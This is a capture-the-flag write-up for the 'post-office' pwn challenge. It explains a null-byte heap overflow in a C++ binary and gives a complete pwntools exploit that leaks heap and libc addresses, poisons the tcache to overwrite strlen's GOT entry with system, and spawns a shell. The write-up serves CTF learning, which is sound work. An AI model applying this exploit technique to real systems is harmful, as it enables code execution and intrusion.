# Write-up: post-office

## Category: pwn

## Author brzeks

A challenge exploring the null-byte heap overflow vulnerability on a modern version of libc using plenty of C++ constructs and other fun stuff like vectors.
The main vulnerability hides inside the `addItem` function where you can overflow the item's name with a null-byte. When the item lays inside a capacity 1 vector then it's possible to overflow into the immediate next malloc chunk thus modifying its size + metadata.
This writeup uses the vulnerability to perform a House of Einherjar-like + T-cache poisoning attack to overwrite a GOT entry and make it point to system.

```py
from pwn import *
import re

context.binary = ELF("./post")

off_sys = -0x186d50 #offset from unsorted bin to system@glibc

r = remote('localhost', 30002)

def addParcel(id):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(id).encode())
    r.sendlineafter(b': ', b'/bin/sh') #printing invoice will trigger strlen(parcel.destination) but we'll replace it with system later

def removeParcel(id):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(id).encode())

def addItem(pid, typ=b'A', weight=b'A', name=b'A'):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b': ', str(pid).encode())
    r.sendlineafter(b': ', typ)
    r.sendlineafter(b': ', weight)
    r.sendlineafter(b': ', name)

def removeItem(pid, idx):
    r.sendlineafter(b'> ', b'5')
    r.sendlineafter(b': ', str(pid).encode())
    r.sendlineafter(b': ', str(idx).encode())

#reserve space for 3 parcels (actually reserves space for 4 parcels :nerd:)
addParcel(0)
addParcel(1)
addParcel(2)

#read uninitialized memory to leak a protected tcache NULL pointer (heap leak)
addItem(0)
removeParcel(0)
addParcel(0)
addItem(0)
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b': ', b'0')
heap_leak = int(re.search(rb'Type: (.*)', r.recvuntil(b'Weight'))[1].decode())
log.info(f'heap leak: {hex(heap_leak)}')

#fill appropriate for vector resizing tcache chunks to avoid splitting the top chunk later
for _ in range(30):
    addItem(0)
removeParcel(0)

# clear out tcache bin for size 1
addItem(1)

#allocate a splitted from top chunk chunk, this will reside just before the victim chunk and be able to overflow with a null byte into victim
addParcel(0)
addItem(0)
removeItem(0, 0) #won't deallocate, setup fake chunk later here

#allocate a victim chunk right after the previous chunk by resizing the vector
#will work thanks to tcache bin filling done previously
for _ in range(31):
    addItem(1)

#setup a fake chunk before victim and overflow into victim size
#PREV_SIZE = 0
#SIZE = 0x21 (represented as double is 1.6304166312761135957826770164651e-322)
#FD = BK = addr of this fake chunk
#NEXT_CHUNK_PREV_SIZE = 0x20
#VICTIM_SIZE &= 0x00 (will set PREV_IN_USE to 0 and initiate backwards consolidation)
fdbk = (heap_leak << 12) + 0x5a0
# addItem(0, PREV_SIZE, SIZE, FD + BK + PREV_SIZE_NEXT_CHUNK + overflow)
addItem(0, b'0', b'1.6304166312761135957826770164651e-322', packing.p64(fdbk) * 2 + b'\x20' + b'\0' * 8)

#since the victim chunk got "resized" down by 0x10 bytes due to the null overflow I'm creating a fake 0x10 sized chunk afterward to fix linkage to the top chunk
removeItem(1, 31)
addItem(1, b'0', b'0', b'A' * 16 + b'\x11')

removeParcel(1) #free victim chunk

addParcel(1)
addItem(1) # clear out tcache[s = 0x30]
addItem(2) # split unsorted chunk (victim)

#as a helpful byproduct the unsorted chunk's FD && BK point to the unsorted bin in main arena in libc so let's leak that
r.sendlineafter(b'> ', b'3') 
r.sendlineafter(b': ', b'2')
libc_leak = int(re.search(rb'Type: (.*)', r.recvuntil(b'Weight'))[1].decode())
log.info(f'libc leak: {hex(libc_leak)}')

removeParcel(1) # free valid chunk into tcache
removeParcel(2) # free victim chunk into tcache

removeItem(0, 0)
addItem(0, b'0', b'0', packing.p64(heap_leak ^ 0x40a010)) # modify FD pointer of the freed chunk to GOT

addParcel(1)
addItem(1)
addParcel(2)

addItem(2, b'A', b'A', packing.p64(libc_leak + off_sys)) #overwrite got strlen to system
r.sendlineafter(b'> ', b'7') # generate invoice which will call system("/bin/sh")

r.interactive()
```